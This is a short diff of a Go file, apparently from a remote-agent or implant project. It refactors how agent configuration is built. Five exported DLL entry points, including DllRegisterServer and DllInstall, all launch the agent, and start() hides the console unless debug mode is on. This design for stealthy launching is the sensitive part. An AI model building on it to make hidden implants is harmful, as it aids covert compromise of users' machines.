@@ -12,7 +12,8 @@ var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
 
 func main() {}
 
-func start(agent *util.AgentConfig) {
+func start() {
+	agent := util.BuildAgentConfig()
 	util.DebugMode = &agent.Debug
 	if !*util.DebugMode {
 		util.HideConsole()
@@ -29,30 +30,25 @@ func start(agent *util.AgentConfig) {
 
 //export VoidFunc
 func VoidFunc() {
-	agent := util.BuildAgentConfig()
-	start(agent)
+	start()
 }
 
 //export RunAgent
 func RunAgent()  {
-	agent := util.BuildAgentConfig()
-	start(agent)
+	start()
 }
 
 //export DllInstall
 func DllInstall() {
-	agent := util.BuildAgentConfig()
-	start(agent)
+	start()
 }
 
 //export DllRegisterServer
 func DllRegisterServer() {
-	agent := util.BuildAgentConfig()
-	start(agent)
+	start()
 }
 
 //export DllUnregisterServer
 func DllUnregisterServer() {
-	agent := util.BuildAgentConfig()
-	start(agent)
+	start()
 }
